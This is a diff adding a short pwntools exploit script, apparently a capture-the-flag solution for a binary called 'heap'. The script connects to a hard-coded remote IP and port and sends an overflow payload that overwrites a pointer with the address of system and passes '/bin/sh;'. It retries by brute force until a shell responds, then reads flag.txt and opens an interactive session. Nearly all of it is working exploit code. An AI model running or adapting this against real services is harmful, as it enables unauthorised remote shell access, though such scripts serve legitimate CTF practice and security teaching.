@@ -1,0 +1,33 @@
+from pwn import *
+
+# system("/bin/sh;???...") perform undefine behaviour -> bruteforces, sometime still give shell
+
+e = ELF("./heap")
+
+script = '''
+b *main
+b *main + 231
+'''
+
+while(True):
+    p = remote("103.69.97.144", 6091)
+    #p = process("./heap")
+    #p = gdb.debug("./heap", gdbscript = script)
+
+    system = 0x40c040
+
+    payload = b"A" * 0x40 + b"/bin/sh;" + b"A" * 8 + p64(system)
+    p.sendlineafter(b"string: \n", payload)
+
+    try:
+        p.sendline(b"echo vanish")
+        p.recvuntil(b"vanish")
+        break
+    except:
+        try:
+            p.close()
+        except:
+            pass
+
+p.sendline(b"cat flag.txt")
+p.interactive()
